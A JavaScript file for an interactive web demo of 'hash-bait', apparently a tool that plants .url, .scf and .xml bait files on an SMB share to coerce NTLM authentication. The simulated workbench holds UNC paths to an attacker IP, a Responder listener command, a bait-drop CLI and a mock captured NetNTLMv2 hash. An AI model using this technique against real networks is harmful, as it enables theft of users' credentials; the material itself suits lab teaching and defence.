// hash-bait — Cyclorama Dawn v2.1.0 interactive SMB Share Coercion Workbench.
// Dual-key (rfs-theme + color-scheme) theme sync with View Transitions,
// declarative Invoker Command copy + fallback, popover="manual" toast,
// accessible tabs with hidden="until-found" beforematch sync, and live CLI builder.
(function () {
  'use strict';

  var root = document.documentElement;
  var reducedMotion = window.matchMedia('(prefers-reduced-motion: reduce)');
  var supportsPopover = Object.hasOwn(HTMLElement.prototype, 'popover');

  // ---- Screen reader announcement & manual-popover toast ----
  var toastEl = document.getElementById('rfs-toast');
  var toastMsgEl = document.getElementById('rfs-toast-msg');
  var toastCloseBtn = document.getElementById('rfs-toast-close');
  var liveStatusEl = document.getElementById('rfs-live-status');
  var toastTimer = null;
  var toastTrigger = null;
  var lastAnnouncement = '';

  function announce(text) {
    if (!text) return;
    if (typeof navigator.ariaNotify === 'function') {
      try {
        navigator.ariaNotify(text, { priority: 'normal' });
        return;
      } catch (e) {}
    }
    if (!liveStatusEl) return;
    var msg = text === lastAnnouncement ? text + '\u00A0' : text;
    lastAnnouncement = msg;
    liveStatusEl.textContent = '';
    window.requestAnimationFrame(function () {
      liveStatusEl.textContent = msg;
    });
  }

  function hideToast(restoreFocus) {
    if (!toastEl) return;
    clearTimeout(toastTimer);
    toastTimer = null;
    var focusWasInside = toastEl.contains(document.activeElement);
    try {
      if (supportsPopover && typeof toastEl.hidePopover === 'function') {
        if (toastEl.matches(':popover-open')) toastEl.hidePopover();
      } else {
        toastEl.classList.remove(':popover-open');
      }
    } catch (e) {
      toastEl.classList.remove(':popover-open');
    }
    if (restoreFocus && focusWasInside && toastTrigger && typeof toastTrigger.focus === 'function') {
      toastTrigger.focus({ preventScroll: true });
    }
  }

  function scheduleToastDismiss() {
    clearTimeout(toastTimer);
    toastTimer = window.setTimeout(function () {
      if (toastEl && toastEl.contains(document.activeElement)) return;
      hideToast(false);
    }, 3200);
  }

  function showToast(msg, kind) {
    if (!toastEl || !toastMsgEl) return;
    var tone = kind === 'fail' ? 'is-fail' : kind === 'warn' ? 'is-warn' : kind === 'info' ? 'is-info' : 'is-ok';
    var tag = kind === 'fail' ? '[x]' : kind === 'warn' ? '[!]' : kind === 'info' ? '[i]' : '[ok]';

    toastTrigger = document.activeElement instanceof HTMLElement ? document.activeElement : null;
    toastEl.className = 'rfs-toast ' + tone;
    toastMsgEl.textContent = '';
    var kSpan = document.createElement('span');
    kSpan.className = 'k';
    kSpan.textContent = tag;
    toastMsgEl.appendChild(kSpan);
    toastMsgEl.appendChild(document.createTextNode(' ' + msg));

    clearTimeout(toastTimer);
    try {
      if (supportsPopover && typeof toastEl.showPopover === 'function') {
        if (toastEl.matches(':popover-open')) toastEl.hidePopover();
        toastEl.showPopover();
      } else {
        toastEl.classList.add(':popover-open');
      }
    } catch (e) {
      toastEl.classList.add(':popover-open');
    }

    announce(tag + ' ' + msg);
    scheduleToastDismiss();
  }

  if (toastEl) {
    toastEl.addEventListener('focusin', function () {
      clearTimeout(toastTimer);
    });
    toastEl.addEventListener('focusout', function (ev) {
      if (!toastEl.contains(ev.relatedTarget)) scheduleToastDismiss();
    });
    if (toastCloseBtn) {
      toastCloseBtn.addEventListener('click', function () {
        if (!supportsPopover) hideToast(true);
        else {
          var prev = toastTrigger;
          window.requestAnimationFrame(function () {
            if (prev && typeof prev.focus === 'function') prev.focus({ preventScroll: true });
          });
        }
      });
    }
  }

  // ---- Theme: LX 263 Dark default, LX 512 Light opt-in, View Transition + dual-key sync ----
  var themeBtn = document.getElementById('theme');

  function isLight() {
    return root.dataset.theme === 'light';
  }

  function readStoredTheme() {
    try {
      return localStorage.getItem('rfs-theme') || localStorage.getItem('color-scheme');
    } catch (e) {
      return null;
    }
  }

  function syncThemeMeta() {
    var light = isLight();
    var mc = document.querySelector('meta[name="theme-color"]');
    if (mc) mc.content = light ? '#F5F7F9' : '#050507';
    var cs = document.querySelector('meta[name="color-scheme"]');
    if (cs) cs.content = light ? 'light' : 'dark';
    if (themeBtn) {
      themeBtn.setAttribute('aria-pressed', String(light));
      themeBtn.setAttribute('aria-label', light ? 'Switch to LX 263 dark theme' : 'Switch to LX 512 light theme');
    }
  }

  function applyTheme(next) {
    if (next === 'light' || next === 'dayshift') root.dataset.theme = 'light';
    else delete root.dataset.theme;
    syncThemeMeta();
  }

  if (themeBtn) {
    themeBtn.addEventListener('click', function () {
      var next = isLight() ? 'dark' : 'light';
      var commit = function () {
        applyTheme(next);
        try {
          localStorage.setItem('rfs-theme', next);
          localStorage.setItem('color-scheme', next);
        } catch (e) {}
      };

      if (!document.startViewTransition || reducedMotion.matches) {
        commit();
        return;
      }

      var r = themeBtn.getBoundingClientRect();
      var x = r.left + r.width / 2;
      var y = r.top + r.height / 2;
      var end = Math.hypot(Math.max(x, window.innerWidth - x), Math.max(y, window.innerHeight - y));
      var transition = document.startViewTransition(commit);
      var animated = transition.ready.then(function () {
        root.animate(
          { clipPath: ['circle(0px at ' + x + 'px ' + y + 'px)', 'circle(' + end + 'px at ' + x + 'px ' + y + 'px)'] },
          { duration: 520, easing: 'cubic-bezier(.22, .61, .36, 1)', pseudoElement: '::view-transition-new(root)' }
        );
      });
      Promise.allSettled([animated, transition.updateCallbackDone, transition.finished]);
    });
  }

  window.addEventListener('storage', function (ev) {
    if (ev.key === 'rfs-theme' || ev.key === 'color-scheme' || ev.key === null) {
      applyTheme(ev.newValue);
    }
  });

  var initialTheme = readStoredTheme();
  if (initialTheme) applyTheme(initialTheme);
  else syncThemeMeta();

  // ---- Copy buttons (Invoker Commands + click fallback, never disabled during feedback) ----
  var copyTimers = new WeakMap();

  function legacyCopy(text) {
    var previousFocus = document.activeElement;
    var field = document.createElement('textarea');
    field.value = text;
    field.setAttribute('readonly', '');
    field.style.cssText = 'position:fixed;inset-block-start:0;opacity:0';
    document.body.appendChild(field);
    field.select();
    try {
      return document.execCommand('copy');
    } catch (e) {
      return false;
    } finally {
      field.remove();
      if (previousFocus && typeof previousFocus.focus === 'function') {
        previousFocus.focus({ preventScroll: true });
      }
    }
  }

  function reportCopy(button, ok) {
    if (!button.dataset.origLabel) button.dataset.origLabel = button.textContent;
    clearTimeout(copyTimers.get(button));
    button.removeAttribute('data-copied');
    button.removeAttribute('data-failed');
    void button.offsetWidth;
    button.setAttribute(ok ? 'data-copied' : 'data-failed', '');
    button.textContent = ok ? '[ok] Copied' : 'Failed';
    showToast(ok ? 'Copied to clipboard.' : 'Clipboard access denied — select and copy manually.', ok ? 'ok' : 'fail');

    copyTimers.set(
      button,
      window.setTimeout(function () {
        button.removeAttribute('data-copied');
        button.removeAttribute('data-failed');
        button.textContent = button.dataset.origLabel || 'Copy';
      }, 1800)
    );
  }

  function copyFromTarget(button, target) {
    if (!button || !target) return;
    var text = target.matches('input, textarea') ? target.value : target.innerText.trim();
    if (!text) return;

    if (navigator.clipboard && typeof navigator.clipboard.writeText === 'function') {
      navigator.clipboard.writeText(text).then(
        function () { reportCopy(button, true); },
        function () { reportCopy(button, legacyCopy(text)); }
      );
    } else {
      reportCopy(button, legacyCopy(text));
    }
  }

  if ('CommandEvent' in window) {
    document.addEventListener('command', function (ev) {
      if (ev.command === '--copy') copyFromTarget(ev.source, ev.target);
    }, true);
  } else {
    document.addEventListener('click', function (ev) {
      if (ev.defaultPrevented) return;
      var button = ev.target.closest('button[command="--copy"]');
      if (!button) return;
      var target = document.getElementById(button.getAttribute('commandfor'));
      if (target) copyFromTarget(button, target);
    });
  }

  // ---- Golden Payload Byte Inspector Tabs (focusgroup + roving fallback + beforematch) ----
  var tablist = document.querySelector('.hb-tablist');
  var tabs = tablist ? Array.prototype.slice.call(tablist.querySelectorAll('[role="tab"]')) : [];
  var panels = tabs.map(function (tab) {
    return document.getElementById('panel-' + tab.dataset.tab);
  });

  function selectTab(kind, opts) {
    var options = opts || {};
    var idx = tabs.findIndex(function (t) { return t.dataset.tab === kind; });
    if (idx < 0) return;

    tabs.forEach(function (tab, i) {
      var active = i === idx;
      tab.setAttribute('aria-selected', String(active));
      tab.tabIndex = active ? 0 : -1;
      tab.toggleAttribute('focusgroupstart', active);
      var panel = panels[i];
      if (panel) {
        if (active) {
          panel.removeAttribute('hidden');
          panel.tabIndex = 0;
        } else {
          panel.hidden = 'until-found';
          panel.removeAttribute('tabindex');
        }
      }
    });

    var activeTab = tabs[idx];
    if (options.focus) activeTab.focus();
    if (options.scroll !== false && typeof activeTab.scrollIntoView === 'function') {
      try {
        activeTab.scrollIntoView({ block: 'nearest', inline: 'nearest', container: 'nearest' });
      } catch (e) {
        activeTab.scrollIntoView({ block: 'nearest', inline: 'nearest' });
      }
    }
  }

  if (tablist && tabs.length) {
    tabs.forEach(function (tab, i) {
      tab.addEventListener('click', function () {
        selectTab(tab.dataset.tab, { focus: false });
      });

      // Selection follows focus when native focusgroup or keyboard arrow moves focus
      tab.addEventListener('focus', function () {
        if (tab.getAttribute('aria-selected') !== 'true') {
          selectTab(tab.dataset.tab, { focus: false });
        }
      });

      if (!Object.hasOwn(HTMLElement.prototype, 'focusGroup')) {
        tab.addEventListener('keydown', function (ev) {
          var nextIdx = null;
          if (ev.key === 'ArrowRight') nextIdx = (i + 1) % tabs.length;
          else if (ev.key === 'ArrowLeft') nextIdx = (i - 1 + tabs.length) % tabs.length;
          else if (ev.key === 'Home') nextIdx = 0;
          else if (ev.key === 'End') nextIdx = tabs.length - 1;
          if (nextIdx !== null) {
            ev.preventDefault();
            selectTab(tabs[nextIdx].dataset.tab, { focus: true });
          }
        });
      }

      var panel = panels[i];
      if (panel) {
        panel.addEventListener('beforematch', function () {
          selectTab(tab.dataset.tab, { focus: false });
        });
      }
    });
  }

  // ---- Interactive 3-Stage SMB Share Coercion Workbench ----
  var CANONICAL = ['url', 'scf', 'xml'];
  var PAYLOADS = {
    url: {
      file: '@bait.url',
      bytes: 108,
      tone: 'b-beacon',
      iconTone: 'rfs-icon-beacon',
      tag: '[icon]',
      triggerLabel: 'Explorer browse',
      unc: '\\\\10.10.14.5\\%USERNAME%.icon',
      browseNote: '10.10.11.23 opened \\\\dc1\\public in Explorer (IconFile lookup)'
    },
    scf: {
      file: '@bait.scf',
      bytes: 85,
      tone: 'b-warn',
      iconTone: 'rfs-icon-warn',
      tag: '[icon]',
      triggerLabel: 'Legacy Explorer',
      unc: '\\\\10.10.14.5\\tools\\nc.ico',
      browseNote: '10.10.11.23 browsed \\\\dc1\\public on legacy Explorer (SCF icon fetch)'
    },
    xml: {
      file: '@bait.xml',
      bytes: 164,
      tone: 'b-steel',
      iconTone: 'rfs-icon-steel',
      tag: '[xsl]',
      triggerLabel: 'Word open',
      unc: '\\\\10.10.14.5\\lure.xsl',
      browseNote: '10.10.11.23 opened @bait.xml in Microsoft Word (XSL fetch)'
    }
  };

  var state = {
    selected: { url: true, scf: true, xml: true },
    phase: 'staged', // 'staged' | 'captured' | 'cleaned'
    capturedOnce: false,
    lastRemovedCount: 0,
    lastTriggerKind: 'url'
  };

  var benchEl = document.getElementById('hb-bench');
  var toggleBtns = Array.prototype.slice.call(document.querySelectorAll('.hb-payload-toggle'));
  var dropBtn = document.getElementById('btn-drop');
  var browseBtn = document.getElementById('btn-browse');
  var cleanBtn = document.getElementById('btn-clean');
  var redropBtn = document.getElementById('btn-redrop');

  var shareBadge = document.getElementById('share-status-badge');
  var shareGrid = document.getElementById('share-grid');
  var shareEmpty = document.getElementById('share-empty');
  var browseBanner = document.getElementById('browse-banner');
  var browseBannerText = document.getElementById('browse-banner-text');

  var cliModeBadge = document.getElementById('cli-mode-badge');
  var cliCodeEl = document.getElementById('wb-cli-code');
  var conduitEl = document.getElementById('wb-conduit');
  var conduitProtoEl = document.getElementById('conduit-proto');
  var traceEl = document.getElementById('wb-trace');

  var respBadge = document.getElementById('resp-status-badge');
  var respMeta = document.getElementById('resp-meta');
  var respPre = document.getElementById('wb-responder');
  var kvClient = document.getElementById('kv-client');
  var kvUser = document.getElementById('kv-user');
  var kvHygiene = document.getElementById('kv-hygiene');

  function activeKinds() {
    return CANONICAL.filter(function (k) { return state.selected[k]; });
  }

  function makeSpan(cls, text) {
    var s = document.createElement('span');
    if (cls) s.className = cls;
    s.textContent = text;
    return s;
  }

  function setBadge(el, toneClass, tag, label) {
    if (!el) return;
    el.className = 'rfs-badge ' + toneClass;
    el.textContent = '';
    el.appendChild(makeSpan('k', tag));
    el.appendChild(document.createTextNode(' ' + label));
  }

  function makeFileIcon(iconTone) {
    var svgNS = 'http://www.w3.org/2000/svg';
    var svg = document.createElementNS(svgNS, 'svg');
    svg.setAttribute('class', 'rfs-icon rfs-icon-sm ' + iconTone);
    svg.setAttribute('viewBox', '0 0 24 24');
    svg.setAttribute('aria-hidden', 'true');
    ['M4.5 3.5h9.5L19.5 9v11.5h-15V3.5z', 'M14 3.5V9h5.5', 'M10.25 13L8.25 15l2 2', 'M13.75 13l2 2-2 2'].forEach(function (d) {
      var p = document.createElementNS(svgNS, 'path');
      p.setAttribute('d', d);
      svg.appendChild(p);
    });
    return svg;
  }

  function renderCli(subcmd, kinds) {
    if (!cliCodeEl) return;
    cliCodeEl.textContent = '';
    var parts = [
      ['rfs-tok-fn', 'hash-bait'],
      ['rfs-tok-kw', subcmd],
      ['rfs-tok-kw', '-t'],
      ['rfs-tok-str', 'dc1'],
      ['rfs-tok-kw', '-s'],
      ['rfs-tok-str', 'public']
    ];
    if (subcmd === 'drop') {
      parts.push(['rfs-tok-kw', '-c'], ['rfs-tok-str', '10.10.14.5']);
    }
    kinds.forEach(function (k) {
      parts.push(['rfs-tok-kw', '-p'], ['rfs-tok-str', k]);
    });
    if (subcmd === 'drop') {
      parts.push(['rfs-tok-kw', '-i'], ['rfs-tok-str', 'eth0']);
    }
    parts.push(['rfs-tok-kw', '-u'], ['rfs-tok-str', 'svc-reader']);

    parts.forEach(function (pair, i) {
      if (i > 0) cliCodeEl.appendChild(document.createTextNode(' '));
      cliCodeEl.appendChild(makeSpan(pair[0], pair[1]));
    });
  }

  function renderTrace(lines) {
    if (!traceEl) return;
    traceEl.textContent = '';
    lines.forEach(function (line, i) {
      if (i > 0) traceEl.appendChild(document.createTextNode('\n'));
      traceEl.appendChild(makeSpan(line.cls, line.tag));
      traceEl.appendChild(document.createTextNode(' ' + line.text));
    });
  }

  function renderResponder(mode, triggerKind) {
    if (!respPre) return;
    respPre.textContent = '';

    function appendLine(nodes, isLast) {
      nodes.forEach(function (n) { respPre.appendChild(n); });
      if (!isLast) respPre.appendChild(document.createTextNode('\n'));
    }

    var meta = PAYLOADS[triggerKind] || PAYLOADS.url;

    if (mode === 'waiting') {
      appendLine([makeSpan('rfs-tok-com', '[i] sudo responder -I eth0 -wv')], false);
      appendLine([
        makeSpan('rfs-tok-kw', '[+]'),
        document.createTextNode(' Listening for events on '),
        makeSpan('rfs-tok-num', '10.10.14.5:445'),
        document.createTextNode('...')
      ], false);
      appendLine([makeSpan('rfs-tok-com', '[i] Waiting for a user to browse \\\\dc1\\public')], true);
    } else if (mode === 'captured') {
      appendLine([
        makeSpan('rfs-tok-kw', '[+]'),
        document.createTextNode(' Triggered via '),
        makeSpan('rfs-tok-str', meta.file),
        document.createTextNode(' (' + meta.unc + ')')
      ], false);
      appendLine([
        makeSpan('rfs-tok-com', '[SMB] NTLMv2-SSP Client   : '),
        makeSpan('rfs-tok-num', '10.10.11.23')
      ], false);
      appendLine([
        makeSpan('rfs-tok-com', '[SMB] NTLMv2-SSP Username : '),
        makeSpan('rfs-tok-str', 'LAB\\jdoe')
      ], false);
      appendLine([
        makeSpan('rfs-tok-com', '[SMB] NTLMv2-SSP Hash     : '),
        makeSpan('hb-tok-hash', 'jdoe::LAB:1122334455667788:4d6f8a9c\u2026e3b1c21a')
      ], false);
      appendLine([
        makeSpan('hb-tok-ok', '[ok]'),
        document.createTextNode(' NetNTLMv2 challenge-response captured (redacted)')
      ], true);
    } else {
      if (state.capturedOnce) {
        appendLine([
          makeSpan('rfs-tok-com', '[SMB] NTLMv2-SSP Hash     : '),
          makeSpan('hb-tok-hash', 'jdoe::LAB:1122334455667788:4d6f8a9c\u2026e3b1c21a')
        ], false);
      }
      appendLine([
        makeSpan('hb-tok-ok', '[ok]'),
        document.createTextNode(' Share //dc1/public verified clean (0 bait files)')
      ], false);
      appendLine([
        makeSpan('rfs-tok-com', '[i] Responder stopped — Ctrl-C')
      ], true);
    }
  }

  function renderWorkbench(pulse) {
    var kinds = activeKinds();
    var count = kinds.length;
    if (benchEl) benchEl.dataset.phase = state.phase;

    // Sync payload toggle buttons
    toggleBtns.forEach(function (btn) {
      var on = !!state.selected[btn.dataset.payload];
      btn.setAttribute('aria-pressed', String(on));
      var k = btn.querySelector('.k');
      if (k) k.textContent = on ? '[x]' : '[ ]';
    });

    if (dropBtn) dropBtn.classList.remove('is-attention');

    // Stage 1: Writable Share
    if (state.phase === 'cleaned') {
      setBadge(shareBadge, 'b-ok', '[clean]', '0 files');
      if (shareGrid) shareGrid.hidden = true;
      if (shareEmpty) shareEmpty.hidden = false;
      if (browseBanner) browseBanner.hidden = true;
    } else {
      if (shareGrid) {
        shareGrid.hidden = false;
        shareGrid.textContent = '';
        kinds.forEach(function (kind) {
          var p = PAYLOADS[kind];
          var tile = document.createElement('button');
          tile.type = 'button';
          tile.className = 'hb-file-tile' + (state.phase === 'captured' ? ' is-coercing' : '') + (pulse ? ' is-pulsing' : '');
          tile.dataset.file = kind;
          tile.setAttribute('aria-label', 'Inspect ' + p.file + ' payload bytes');

          var top = document.createElement('span');
          top.className = 'hb-file-top';
          top.appendChild(makeFileIcon(p.iconTone));
          top.appendChild(makeSpan('hb-file-name', p.file));
          top.appendChild(makeSpan('hb-file-size', p.bytes + ' B'));

          var meta = document.createElement('span');
          meta.className = 'hb-file-meta';
          var badge = document.createElement('span');
          badge.className = 'rfs-badge ' + p.tone;
          badge.appendChild(makeSpan('k', p.tag));
          badge.appendChild(document.createTextNode(' ' + p.triggerLabel));
          meta.appendChild(badge);
          meta.appendChild(makeSpan('hb-file-unc', p.unc));

          tile.appendChild(top);
          tile.appendChild(meta);
          tile.addEventListener('click', function () {
            selectTab(kind, { focus: true });
          });
          shareGrid.appendChild(tile);
        });
      }
      if (shareEmpty) shareEmpty.hidden = true;

      if (state.phase === 'captured') {
        setBadge(shareBadge, 'b-beacon', '[coercing]', count + (count === 1 ? ' file' : ' files'));
        if (browseBanner) browseBanner.hidden = false;
        if (browseBannerText) browseBannerText.textContent = PAYLOADS[state.lastTriggerKind].browseNote;
      } else {
        setBadge(shareBadge, 'b-warn', '[staged]', count + (count === 1 ? ' file' : ' files'));
        if (browseBanner) browseBanner.hidden = true;
      }
    }

    // Stage 2: Live CLI Builder, Coercion Conduit & Status Trace
    if (state.phase === 'cleaned') {
      setBadge(cliModeBadge, 'b-ok', '[cmd]', 'clean');
      renderCli('clean', kinds);
      if (conduitEl) conduitEl.classList.remove('is-active', 'is-pulsing');
      if (conduitProtoEl) conduitProtoEl.textContent = 'SMB2/3 DELETE · CLEAN';
      renderTrace([
        { cls: 'hb-tok-ok', tag: '[ok]', text: 'removed ' + state.lastRemovedCount + ' payload(s) from //dc1/public' }
      ]);
    } else if (state.phase === 'captured') {
      setBadge(cliModeBadge, 'b-beacon', '[cmd]', 'drop');
      renderCli('drop', kinds);
      if (conduitEl) {
        conduitEl.classList.add('is-active');
        conduitEl.classList.toggle('is-pulsing', !!pulse);
      }
      if (conduitProtoEl) conduitProtoEl.textContent = 'NETNTLMV2 · TCP 445';
      renderTrace([
        { cls: 'hb-tok-ok', tag: '[ok]', text: 'dropped ' + count + ' payload(s) on //dc1/public' },
        { cls: 'hb-tok-info', tag: '[i]', text: 'client 10.10.11.23 coerced -> 10.10.14.5:445' }
      ]);
    } else {
      setBadge(cliModeBadge, 'b-steel', '[cmd]', 'drop');
      renderCli('drop', kinds);
      if (conduitEl) conduitEl.classList.remove('is-active', 'is-pulsing');
      if (conduitProtoEl) conduitProtoEl.textContent = 'SMB2/3 · TCP 445';
      renderTrace([
        { cls: 'hb-tok-ok', tag: '[ok]', text: 'dropped ' + count + ' payload(s) on //dc1/public' },
        { cls: 'hb-tok-info', tag: '[i]', text: 'starting Responder on eth0 — Ctrl-C to stop' }
      ]);
    }

    // Stage 3: Responder Capture Panel
    if (state.phase === 'captured') {
      setBadge(respBadge, 'b-ok', '[ok]', 'CAPTURED');
      if (respMeta) respMeta.textContent = 'NETNTLMV2 RECEIVED';
      renderResponder('captured', state.lastTriggerKind);
      if (kvClient) kvClient.textContent = '10.10.11.23 (SMB2)';
      if (kvUser) kvUser.textContent = 'LAB\\jdoe';
      if (kvHygiene) kvHygiene.textContent = count + ' bait file(s) still on share';
    } else if (state.phase === 'cleaned') {
      setBadge(respBadge, 'b-ok', '[ok]', 'SHARE CLEAN');
      if (respMeta) respMeta.textContent = 'CLEANUP VERIFIED';
      renderResponder('cleaned', state.lastTriggerKind);
      if (kvClient) kvClient.textContent = state.capturedOnce ? '10.10.11.23 (logged)' : 'No capture yet';
      if (kvUser) kvUser.textContent = state.capturedOnce ? 'LAB\\jdoe' : '—';
      if (kvHygiene) kvHygiene.textContent = '0 bait files remaining';
    } else {
      setBadge(respBadge, 'b-steel', '[i]', 'LISTENING');
      if (respMeta) respMeta.textContent = 'WAITING ON :445';
      renderResponder('waiting', kinds[0]);
      if (kvClient) kvClient.textContent = 'Waiting for SMB auth';
      if (kvUser) kvUser.textContent = '—';
      if (kvHygiene) kvHygiene.textContent = count + ' bait file(s) staged';
    }

    if (pulse) {
      window.setTimeout(function () {
        if (conduitEl) conduitEl.classList.remove('is-pulsing');
        if (shareGrid) {
          Array.prototype.slice.call(shareGrid.querySelectorAll('.is-pulsing')).forEach(function (el) {
            el.classList.remove('is-pulsing');
          });
        }
      }, 1350);
    }
  }

  // Bind payload toggle chips (keep at least 1 active)
  toggleBtns.forEach(function (btn) {
    btn.addEventListener('click', function () {
      var kind = btn.dataset.payload;
      if (!kind || !(kind in state.selected)) return;
      var currentlyActive = activeKinds();
      if (state.selected[kind] && currentlyActive.length === 1) {
        showToast('At least one payload format must stay active.', 'warn');
        return;
      }
      state.selected[kind] = !state.selected[kind];
      if (state.phase === 'captured') state.phase = 'staged';
      renderWorkbench(false);
    });
  });

  function runDrop() {
    var count = activeKinds().length;
    state.phase = 'staged';
    renderWorkbench(false);
    showToast('Dropped ' + count + ' payload(s) on //dc1/public.', 'ok');
  }

  if (dropBtn) dropBtn.addEventListener('click', runDrop);
  if (redropBtn) redropBtn.addEventListener('click', runDrop);

  if (browseBtn) {
    browseBtn.addEventListener('click', function () {
      if (state.phase === 'cleaned') {
        if (dropBtn) dropBtn.classList.add('is-attention');
        showToast('Share is clean — drop bait first to coerce authentication.', 'warn');
        return;
      }
      var kinds = activeKinds();
      state.lastTriggerKind = kinds[0];
      state.phase = 'captured';
      state.capturedOnce = true;
      renderWorkbench(true);
      selectTab(state.lastTriggerKind, { focus: false, scroll: false });
      showToast('NetNTLMv2 challenge-response captured from LAB\\jdoe.', 'ok');
    });
  }

  if (cleanBtn) {
    cleanBtn.addEventListener('click', function () {
      if (state.phase === 'cleaned') {
        showToast('Share //dc1/public is already clean.', 'info');
        return;
      }
      state.lastRemovedCount = activeKinds().length;
      state.phase = 'cleaned';
      renderWorkbench(false);
      showToast('Removed ' + state.lastRemovedCount + ' payload(s) from //dc1/public.', 'ok');
    });
  }

  // Wire initial static share tiles to inspect tabs on load
  if (shareGrid) {
    Array.prototype.slice.call(shareGrid.querySelectorAll('.hb-file-tile')).forEach(function (tile) {
      tile.addEventListener('click', function () {
        selectTab(tile.dataset.file, { focus: true });
      });
    });
  }
})();
